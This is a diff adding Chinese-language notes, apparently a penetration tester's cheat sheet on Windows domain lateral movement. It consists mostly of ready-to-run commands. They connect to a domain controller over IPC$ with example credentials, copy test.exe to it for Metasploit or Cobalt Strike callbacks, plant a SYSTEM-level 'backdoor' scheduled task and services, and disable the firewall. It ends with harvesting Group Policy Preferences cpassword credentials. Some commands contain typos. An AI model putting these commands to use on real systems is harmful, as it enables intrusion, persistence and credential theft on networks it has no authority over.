@@ -1,0 +1,123 @@
+>；									建立IPC连接										     ；
+IPC$(Internet Process Connection) 是共享 " 命名管道 " 的资源，它是为了让进程间通信
+	而开放的命名管道，通过提供可信任的用户名和口令，连接双方可以建立安全的通道并以此通道进
+	行加密数据的交换，从而实现对远程计算机的访问。IPC$是NT2000的一项新功能，它有一个特点，
+	即在同一时间内，两个IP之间只允许建立一个连接。IPC 可以通过验证用户名和密码获得相应的权限，
+	通常在远程管理计算机和查看计算机的共享资源时使用。
+
+通过ipc$，可以与目标机器建立连接。利用这个连接，不仅可以访问目标机器中的文件，进行上传、
+	下载等操作，还可以在目标机器上运行其他命令，以获取目标机器的目录结构、用户列表等信息。
+
+通过执行以下命令，我们可以让win7与DC建立IPC连接:
+#与域内目标主机建立连接
+net use \\<DC的IP>\ipc$ "password" /user:"username"  
+net use \\192.168.183.130\ipc$ "Liu78963" /user:"administrator"
+
+#查看当前主机所建立的连接
+net use  
+
+#查看目标主机上的时间
+net time \\192.168.183.130  
+
+#列出目标主机C盘的目录
+dir \\192.168.183.130\c$  
+
+#将whoami.txt复制到目标主机C盘
+copy C:\user\xiaobendan\Desktop\whoami.txt \\192.168.183.130\C$  
+
+tasklist /s(system) 192.168.183.130 /U(username) administrator /P(password) 123456 //列出目标主机上运行的进程，需要用户名和密码
+
+建立 ipc$ 连接条件:
+1. 目标主机开启了139和445端口
+2. 目标主机管理员开启了ipc$默认共享
+
+#删除 ipc$ 连接
+net use \\192.168.183.130 /del /y
+
+#建立目标主机C盘的共享连接
+net usr \\192.168.183.130\C$ "123456" /user:"administrator" 
+
+#将test.exe复制到目标主机的共享C盘下
+copy C:\user\douser\desktop\test.exe \\192.168.183.130\c$  
+
+#在目标主机上创建计划任务运行test.exe
+schtasks(at) \\192.168.183.130 18:22:00 C:\test.exe 
+#创建计划任务后，会返回计划任务的ID值
+
+
+可以用MSF和CS连接test.exe上线:
+#删除
+schtasks \\192.168.183.130 ID /del
+
+#在目标主机上执行计划任务，将结果保存到.txt文件 （计划任务命令不会回显输出）
+schtasks \\193.168.183.130 18:25:00 CMD.exe /c "ipconfig > C:\users\xiaobendan\result.txt" 
+
+#查看计划任务的输出
+type \\192.168.183.130\C$\users\xiaobendan\result.txt  
+
+#在目标主机上创建 backdoor 的计划任务，它每分钟启动一次，启动程序为 C:\test.exe, 
+#	权限为 system 权限（这个命令可能会创建失败：拒绝访问）
+schtasks /create /s 192.168.183.130 /tn backdoor /sc minute /mo 1 /tr C:\test.exe /ru system /f
+
+#使用系统权限用户创建
+schtasks /create /s 192.168.183.130 /u administrator /p 123456 /tn(taskname) 
+	backdoor /sc minute /mo 1 /tr C:\test.exe /ru system /f
+
+#直接运行目标上的计划任务
+schtasks /run /s 192.168.183.130 /i /tn backdoor  
+#/i 忽略任何限制立即运行任务（这个命令可能执行失败：拒绝访问）
+
+#使用高权限用户运行 同上
+schtasks /run /s 192.168.183.130 /i /tn backdoor -u administrator -p 123456
+
+#强制删除这个计划任务 backdoor
+schtasks /delete /s 192.168.183.130 /tn backdoor /f 
+
+#创建计划任务，将输出保存到result.txt （如果拒绝访问：-u -p  高权限用户运行）
+schtasks /create /s 192.168.183.130 /tn backdoor /sc minute /mo 1 
+	/tr "C:\Windows\Sytem32\CMD.exe /c 'whoami > C:\users\xiaobendan\result.txt' " /ru system /f
+
+#强制直接运行计划任务
+schtasks /run /s 192.168.183.130 /i /tn backdoor 
+
+#查看计划任务输出
+type \\192.168.183.130\C$\users\xiaobendan\result.txt 
+
+
+建立目标主机 ipc$ 连接 (MSF or CS 上线):
+#将test.exe上传到目标共享C盘
+copy C:\test.exe \\192.168.183.130\C$  
+
+#在目标主机上创建服务
+sc create \\192.168.183.130(主机名) TestService(服务名) binpath= "C:\test.exe" 
+#(= 后面必须空一格，否则会错误)
+
+#启动目标主机上的服务
+sc \\192.168.183.130 start TestService  
+
+#删除目标主机上的服务
+sc \\192.168.183.130 delete TestService 
+
+#创建关闭目标主机防火墙的服务
+sc \\192.168.183.130 create DisableFirewall binpath= "netsh advfirewall set allprofiles state off"
+
+#启动该服务
+sc \\192.168.183.130 start DisableFirewall 
+
+
+Windows组策略首选项提权:
+SYSVOL是活动目录里面的一个用于存储公共文件服务器副本的共享文件夹，在域中的所有域控制器之间进行
+	复制。SYSVOL文件夹是在安装活动目录时自动创建的，主要用来存放登录脚本、组策略数据及其他域控制器
+	需要的域信息等。SYSVOL在所有经过身份验证的域用户或者域信任用户范围内共享，都可以读取。整个SYSVOL
+	目录在所有的域控制器中是自动同步共享的，所有的域策略均存放在C:\Windows\SYSVOL\DOMAIN\Policies\
+	目录中。
+
+管理员在域中新建一个组策略批量修改域中机器的本地管理员密码后，操作系统会自动在SYSVOL共享目录中
+	生成一个XML文件，该文件中保存了该组策略更新后的密码。该密码使用AES-256加密算法，安全性还是比较
+	高的。但是，2012年微软在官方网站上公布了该密码的私钥，导致保存在XML文件中的密码的安全性大大降低
+	。由于任何域用户和域信任的用户均可对该共享目录进行访问，这就意味着，任何用户都可以访问保存在XML
+	文件中的密码并将其解密，从而控制域中所有使用该账号、密码的本地管理员计算机。
+	我们可以在SYSVOL中搜索包含cpassword获取组策略的凭据。
+
+
+
